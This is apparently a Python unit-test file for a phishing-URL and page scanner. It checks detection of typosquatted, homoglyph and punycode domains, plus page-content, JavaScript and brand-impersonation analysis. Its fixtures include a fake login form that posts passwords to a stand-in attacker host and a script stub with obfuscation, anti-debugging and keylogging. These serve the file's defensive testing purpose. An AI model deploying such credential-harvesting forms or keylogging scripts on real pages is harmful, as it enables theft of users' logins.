import unittest
from app import create_app
from app.services.scanner_service import ScannerService
from app.scanners.phishing_detector import PhishingDetector

class TestPhishingDetector(unittest.TestCase):
    def setUp(self):
        self.app = create_app()
        self.ctx = self.app.app_context()
        self.ctx.push()
        self.service = ScannerService()
        self.detector = PhishingDetector()

    def tearDown(self):
        self.ctx.pop()

    def test_legitimate_official_domains(self):
        """Official brand domains and subdomains must receive 0 false positive penalties."""
        for target in ["https://paypal.com", "https://login.microsoft.com", "https://accounts.google.com"]:
            res = self.service.scan_phishing(target)
            self.assertEqual(res["status"], "success")
            self.assertTrue(res["is_official_brand_domain"])
            self.assertFalse(res["impersonation_detected"])
            self.assertEqual(res["risk_score"], 0)
            self.assertEqual(res["verdict"], "Safe")
            self.assertEqual(res["threat_level"], "Low")
            self.assertIn("Safe", res["verdict_explanation"])
            self.assertGreaterEqual(res["confidence_score"], 90)

    def test_homoglyph_lookalike(self):
        """paypaI.com (Capital I substitution) must trigger brand impersonation alert and Phishing verdict."""
        res = self.service.scan_phishing("http://paypaI.com")
        self.assertEqual(res["status"], "success")
        self.assertTrue(res["impersonation_detected"])
        self.assertIsNotNone(res["impersonation_details"])
        self.assertEqual(res["impersonation_details"]["suspected_brand"], "Paypal")
        self.assertGreaterEqual(res["risk_score"], 50)
        self.assertIn(res["verdict"], ["Suspicious", "Phishing"])
        self.assertIsNotNone(res["verdict_explanation"])

    def test_typosquatting_transposition(self):
        """micorsoft.com (typosquatting transposition) must trigger impersonation and high risk."""
        res = self.service.scan_phishing("http://micorsoft.com")
        self.assertEqual(res["status"], "success")
        self.assertTrue(res["impersonation_detected"])
        self.assertEqual(res["impersonation_details"]["suspected_brand"], "Microsoft")
        self.assertGreaterEqual(res["risk_score"], 50)
        self.assertIn(res["verdict"], ["Suspicious", "Phishing"])

    def test_typosquatting_insertion_deletion_substitution(self):
        """Tests insertion (paypaal.com), deletion (paypl.com), substitution (m1crosoft.com)."""
        # Insertion
        res_ins = self.service.scan_phishing("http://paypaal.com")
        self.assertTrue(res_ins["impersonation_detected"])
        self.assertEqual(res_ins["impersonation_details"]["suspected_brand"], "Paypal")

        # Deletion
        res_del = self.service.scan_phishing("http://paypl.com")
        self.assertTrue(res_del["impersonation_detected"])
        self.assertEqual(res_del["impersonation_details"]["suspected_brand"], "Paypal")

        # Substitution
        res_sub = self.service.scan_phishing("http://m1crosoft.com")
        self.assertTrue(res_sub["impersonation_detected"])
        self.assertEqual(res_sub["impersonation_details"]["suspected_brand"], "Microsoft")

    def test_ip_address_url(self):
        """Raw IP address URLs must be flagged as high risk."""
        res = self.service.scan_phishing("http://192.168.1.1/login")
        self.assertEqual(res["status"], "success")
        self.assertGreaterEqual(res["risk_score"], 50)
        self.assertIn(res["verdict"], ["Suspicious", "Phishing"])

    def test_punycode_homograph(self):
        """Punycode IDN homograph domain must trigger critical impersonation alert."""
        res = self.service.scan_phishing("http://xn--pypal-4ve.com")
        self.assertEqual(res["status"], "success")
        self.assertTrue(res["impersonation_detected"])
        self.assertGreaterEqual(res["risk_score"], 50)

    def test_suspicious_tld_and_keywords(self):
        """Suspicious TLD + credential keywords must combine into high risk score."""
        res = self.service.scan_phishing("http://secure-account-verify-login.xyz")
        self.assertEqual(res["status"], "success")
        self.assertGreaterEqual(res["risk_score"], 25)
        self.assertIn(res["verdict"], ["Suspicious", "Phishing"])
        self.assertIsNotNone(res["verdict_explanation"])

    def test_authority_userinfo_obfuscation(self):
        """URL containing '@' userinfo trick must trigger obfuscation alert."""
        res = self.service.scan_phishing("http://google.com@evil-attacker-site.com/login")
        self.assertEqual(res["status"], "success")
        self.assertGreaterEqual(res["risk_score"], 25)
        self.assertIsNotNone(res["confidence_score"])

    def test_page_content_analysis_engine(self):
        """Verifies HTML inspection engine flags cross-domain form actions and urgency keywords."""
        reasons = []
        recommendations = []
        categories = {"page_content": {"score": 0, "findings": []}}
        
        def add_risk(points, cat_key, rule, evidence, severity="Medium", message="", why_it_matters="", owasp_ref="N/A"):
            categories[cat_key]["score"] += points
            if message:
                categories[cat_key]["findings"].append({"message": message, "severity": severity})

        html_sample = """
        <html>
            <head><title>Verify Account</title></head>
            <body>
                <form action="http://attacker-server.com/steal.php" method="POST">
                    <input type="text" name="username">
                    <input type="password" name="password">
                    <button type="submit">Log In</button>
                </form>
                <p>Account suspended! Verify your identity immediately within 24 hours.</p>
            </body>
        </html>
        """

        self.detector._analyze_page_content(
            html_content=html_sample,
            target_url="http://fake-bank-login.com",
            raw_host="fake-bank-login.com",
            domain="fake-bank-login.com",
            add_risk=add_risk,
            reasons=reasons,
            recommendations=recommendations
        )

        self.assertGreater(categories["page_content"]["score"], 0)
        findings = [f["message"] for f in categories["page_content"]["findings"]]
        self.assertTrue(any("Cross-domain" in f or "external" in f for f in findings))

    def test_javascript_analysis_engine(self):
        """Verifies JavaScript inspection engine flags obfuscated code, keyloggers, and anti-debugging."""
        reasons = []
        recommendations = []
        categories = {"javascript_analysis": {"score": 0, "findings": []}}

        def add_risk(points, cat_key, rule, evidence, severity="Medium", message="", why_it_matters="", owasp_ref="N/A"):
            categories[cat_key]["score"] += points
            if message:
                categories[cat_key]["findings"].append({"message": message, "severity": severity})

        js_html_sample = """
        <html>
            <body>
                <script>
                    eval(function(p,a,c,k,e,r){return p;}('0',1,1,'code'.split('|'),0,{}));
                    document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
                    document.addEventListener('keydown', function(e){ if(e.keyCode == 123) return false; });
                    inputElem.addEventListener('keypress', function(e){ sendKey(e.key); });
                </script>
            </body>
        </html>
        """

        self.detector._analyze_javascript(
            html_content=js_html_sample,
            target_url="http://fake-site.com",
            add_risk=add_risk,
            reasons=reasons,
            recommendations=recommendations
        )

        self.assertGreater(categories["javascript_analysis"]["score"], 0)
        findings = [f["message"] for f in categories["javascript_analysis"]["findings"]]
        self.assertTrue(any("obfuscated" in f.lower() or "anti-debugging" in f.lower() or "keylogger" in f.lower() for f in findings))

    def test_visual_brand_analysis_engine(self):
        """Verifies visual brand inspection engine flags cross-domain favicon and visual login title headers."""
        reasons = []
        recommendations = []
        categories = {"visual_brand": {"score": 0, "findings": []}}

        def add_risk(points, cat_key, rule, evidence, severity="Medium", message="", why_it_matters="", owasp_ref="N/A"):
            categories[cat_key]["score"] += points
            if message:
                categories[cat_key]["findings"].append({"message": message, "severity": severity})

        visual_html_sample = """
        <html>
            <head>
                <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico">
                <title>Sign in to your Microsoft account</title>
            </head>
            <body>
                <h1>Sign in to your Microsoft account</h1>
            </body>
        </html>
        """

        self.detector._analyze_visual_brand(
            html_content=visual_html_sample,
            target_url="http://phishing-portal.com",
            raw_host="phishing-portal.com",
            add_risk=add_risk,
            reasons=reasons,
            recommendations=recommendations
        )

        self.assertGreater(categories["visual_brand"]["score"], 0)
        findings = [f["message"] for f in categories["visual_brand"]["findings"]]
        self.assertTrue(any("favicon" in f.lower() or "microsoft" in f.lower() for f in findings))

if __name__ == "__main__":
    unittest.main()
